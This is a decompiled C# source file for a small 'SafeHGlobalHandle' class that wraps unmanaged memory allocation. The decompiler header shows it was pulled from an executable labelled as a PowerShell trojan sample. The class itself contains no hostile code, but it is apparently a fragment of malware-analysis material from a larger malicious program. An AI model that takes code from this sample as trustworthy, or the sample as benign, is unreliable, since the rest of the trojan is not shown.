// Decompiled with JetBrains decompiler
// Type: HeavyDuck.SafeHGlobalHandle
// Assembly: RemotingFieldCachedD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EDD4CF72-357A-47DC-BB8E-50FC31FC092E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan.MSIL.PowerShell.gen-1095c007bb641be5c286e491a4f4ced026984a7767f930ee09c4d2995b5a76f2.exe

using System;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;

namespace HeavyDuck
{
  internal sealed class SafeHGlobalHandle : SafeHandle
  {
    private readonly int _size;

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    private SafeHGlobalHandle(IntPtr toManage, int size)
      : base(IntPtr.Zero, true)
    {
      this._size = size;
      this.SetHandle(toManage);
    }

    private SafeHGlobalHandle()
      : base(IntPtr.Zero, true)
    {
    }

    public override bool IsInvalid => IntPtr.Zero == this.handle;

    public int Size => this._size;

    public static SafeHGlobalHandle Allocate(int bytes) => new SafeHGlobalHandle(Marshal.AllocHGlobal(bytes), bytes);

    public static SafeHGlobalHandle Invalid() => new SafeHGlobalHandle();

    protected override bool ReleaseHandle()
    {
      Marshal.FreeHGlobal(this.handle);
      return true;
    }
  }
}
